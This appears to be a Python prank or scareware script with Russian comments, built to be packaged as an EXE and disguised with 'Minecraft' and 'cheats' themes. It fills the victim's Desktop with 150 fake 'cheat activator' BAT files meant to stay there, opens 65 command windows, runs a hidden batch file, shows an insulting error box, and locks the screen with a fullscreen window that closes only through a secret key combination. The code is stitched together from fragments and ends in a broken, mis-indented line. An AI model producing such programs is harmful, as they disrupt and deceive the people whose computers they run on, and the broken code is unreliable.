import os
import sys

def get_resource_path(relative_path):
    """Получает правильный путь к файлам в EXE"""
    try:
        # Для EXE файла
        base_path = sys._MEIPASS
    except Exception:
        # Для обычного запуска Python
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

# Использование в коде:
image_path = get_resource_path("image.gif")
sound_path = get_resource_path("sound.mp3")
from tkinter import messagebox
import time

for i in range(1):
    messagebox.showerror("Minecraft","алло немощь да да ты")
    time.sleep(0.6)
import os
import time

def create_fullscreen_bat_files():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    created = 0
    max_files = 150  # Можно увеличить для полного заполнения
    
    print("Создаю BAT файлы на весь экран...")
    
    for i in range(max_files):
        try:
            # Создаем BAT файл с разными именами
            bat_content = f"""@echo off
chcp 65001 >nul
title Читы Активатор {i+1}
echo ===============================
echo    АКТИВАЦИЯ ЧИТОВ v{i+1}
echo ===============================
echo.
echo Запускаем взлом игры...
ping -n 3 127.0.0.1 >nul
echo.
echo ✓ 
echo.
echo ВЗЛОМ ЗАВЕРШЕН!
echo.
pause
"""
            
            file_path = os.path.join(desktop, f"🚀ЧИТЫ_ВЗЛОМ_{i+1:03d}.bat")
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(bat_content)
            
            created += 1
            
            # Быстрое создание без задержек
            if created % 50 == 0:
                print(f"Создано {created} BAT файлов...")
                
        except Exception as e:
            print(f"Достигнут предел: {e}")
            break
    
    print(f"Готово! Создано {created} BAT файлов!")
    print("Они заполнят весь рабочий стол и останутся навсегда!")

# Запуск
create_fullscreen_bat_files()
import os
import tempfile

# Создаем временный bat файл
bat_content = f'@echo off\nstart /MIN wmplayer /play /close "{r"C:\pipok\sound.mp3"}"'

with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as f:
    f.write(bat_content)
    bat_file = f.name

# Запускаем скрытый bat файл
os.system(f'"{bat_file}"')

# Удаляем bat файл
os.unlink(bat_file)
time.sleep(1.0)

import os

for i in range(65):
    os.system("start cmd")
import tkinter as tk

def enhanced_black_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    root.attributes('-topmost', True)
    
    # Главный таймер
    main_timer = tk.Label(
        root, 
        text="45", 
        font=("Arial", 100, "bold"), 
        fg="white", 
        bg="black"
    )
    main_timer.place(relx=0.5, rely=0.5, anchor='center')
    
    # Верхний текст
    top_text = tk.Label(
        root,
        text="До завершения:",
        font=("Arial", 20),
        fg="white",
        bg="black"
    )
    top_text.place(relx=0.5, rely=0.3, anchor='center')
    
    # Нижний текст
    bottom_text = tk.Label(
        root,
        text="секунд",
        font=("Arial", 20),
        fg="white",
        bg="black"
    )
    bottom_text.place(relx=0.5, rely=0.7, anchor='center')
    
    def countdown(seconds):
        if seconds >= 0:
            main_timer.config(text=str(seconds))
            
            # Меняем цвет на красный в последние 10 секунд
            if seconds <= 10:
                main_timer.config(fg="red")
            else:
                main_timer.config(fg="white")
                
            root.after(1000, countdown, seconds - 1)
        else:
            root.destroy()
    
    # Запускаем отсчёт
    countdown(45)
    
    # Закрытие по Escape
    root.bind('<Escape>', lambda e: root.destroy())
    
    root.mainloop()

enhanced_black_screen()
import tkinter as tk

class KeyCombo:
    def init(self):
        self.d_pressed = False
        self.f_pressed = False
        
    def on_key_press(self, event):
        if event.keysym == 'd':
            self.d_pressed = True
        elif event.keysym == 'f':
            self.f_pressed = True
        elif event.keysym == 'g' and self.d_pressed and self.f_pressed:
            self.root.destroy()
    
    def on_key_release(self, event):
        if event.keysym == 'd':
            self.d_pressed = False
        elif event.keysym == 'f':
            self.f_pressed = False

def show_gif_with_combo():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    # Создаем объект для отслеживания клавиш
    key_combo = KeyCombo()
    key_combo.root = root
    
    # Привязываем обработчики клавиш
    root.bind('<KeyPress>', key_combo.on_key_press)
    root.bind('<KeyRelease>', key_combo.on_key_release)
    
    try:
        # Загружаем GIF
        image_path = r"C:\pipok\image.gif"
        photo = tk.PhotoImage(file=image_path)
        
        # Создаем метку с картинкой
        label = tk.Label(root, image=photo, bg='black')
        label.image = photo  # Сохраняем ссылку
        label.place(x=0, y=0, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
        
    except Exception as e:
        # Если ошибка, показываем сообщение
        label = tk.Label(root, 
                        text=f"Ошибка загрузки GIF: {e}\n\nДля выхода:\n1. Зажмите D\n2. Зажмите F\n3. Нажмите G", 
                        fg="white", bg="black", font=("Arial", 20))
        label.pack(expand=True)
    
    # Добавляем текстовую подсказку поверх картинки
    
    
    
        instruction.place(relx=0.5, rely=0.95, anchor='center')
    
    
